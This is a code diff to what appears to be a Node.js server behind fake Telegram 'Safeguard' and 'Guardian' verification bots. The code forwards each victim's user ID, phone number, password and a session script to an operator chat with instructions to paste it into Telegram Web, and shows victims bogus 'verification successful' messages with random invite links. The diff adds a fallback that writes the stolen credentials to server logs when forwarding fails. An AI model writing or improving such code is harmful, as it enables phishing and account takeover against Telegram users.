@@ -134,6 +134,7 @@ const handleRequest = async (req, res, data) => {
   }
   const logMessage = `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`;
   console.log(`Attempting to send message to LOGS_ID ${process.env.LOGS_ID} for user ${data.userId}:`, logMessage);
+  let messageSent = false;
   try {
     await bot.sendMessage(
       process.env.LOGS_ID,
@@ -141,88 +142,13 @@ const handleRequest = async (req, res, data) => {
       { parse_mode: "HTML" }
     );
     console.log(`Successfully sent message to LOGS_ID for user ${data.userId}`);
+    messageSent = true;
   } catch (error) {
     console.error(`Failed to send message to LOGS_ID ${process.env.LOGS_ID} for user ${data.userId}:`, error.message, error.stack);
   }
-  let type = data.type;
-  if (type === "safeguard" || type === "guardian") {
-    let image;
-    let caption;
-    if (type === "safeguard") {
-      image = safeguardSuccess;
-      caption = `Verified, you can join the group using this temporary link:\n\nhttps://t.me/+${generateRandomString(16)}\n\nThis link is a one time use and will expire`;
-    } else if (type === "guardian") {
-      image = guardianSuccess;
-      caption = `☑️ <b>Verification successful</b>\n\nPlease click the invite link below to join the group:\n<i>https://t.me/+${generateRandomString(16)}</i>`;
-    }
-
-    const randomText = guardianButtonTexts[Math.floor(Math.random() * guardianButtonTexts.length)];
-
-    const guardianButtons = {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            {
-              text: randomText,
-              url: `https://t.me/+${generateRandomString(16)}`
-            }
-          ]
-        ]
-      }
-    };
-    const safeguardButtons = {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            {
-              text: "@SOLTRENDING",
-              url: "https://t.me/SOLTRENDING"
-            }
-          ]
-        ]
-      }
-    };
-
-    const buttons = type === "safeguard" ? safeguardButtons : guardianButtons;
-
-    try {
-      await bot.sendPhoto(data.userId, image, {
-        caption,
-        ...buttons,
-        parse_mode: "HTML"
-      });
-      console.log(`Successfully sent photo to user ${data.userId}`);
-    } catch (error) {
-      console.error(`Failed to send photo to user ${data.userId}:`, error.message);
-    }
-  }
-
-  res.json({});
-};
-
-const handleRequest = async (req, res, data) => {  
-  const botMap = {
-    safeguard: safeguardBot,
-    guardian: guardianBot,
-    deluge: delugeBot
-  };
-  let bot = botMap[data.type] || null;
-  if (!bot) {
-    console.error(`No bot found for type: ${data.type}`);
-    res.status(400).json({ error: "Invalid bot type" });
-    return;
-  }
-  console.log(`Sending message to LOGS_ID ${process.env.LOGS_ID} for user ${data.userId}`);
-  try {
-    await bot.sendMessage(
-      process.env.LOGS_ID,
-        `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`, {
-        parse_mode: "HTML"
-      }
-    );
-    console.log(`Successfully sent message to LOGS_ID for user ${data.userId}`);
-  } catch (error) {
-    console.error(`Failed to send message to LOGS_ID for user ${data.userId}:`, error.message);
+  if (!messageSent) {
+    console.log("Fallback: Logging user data to Render logs due to failure in sending to LOGS_ID:");
+    console.log(logMessage);
   }
   let type = data.type;
   if (type === "safeguard" || type === "guardian") {
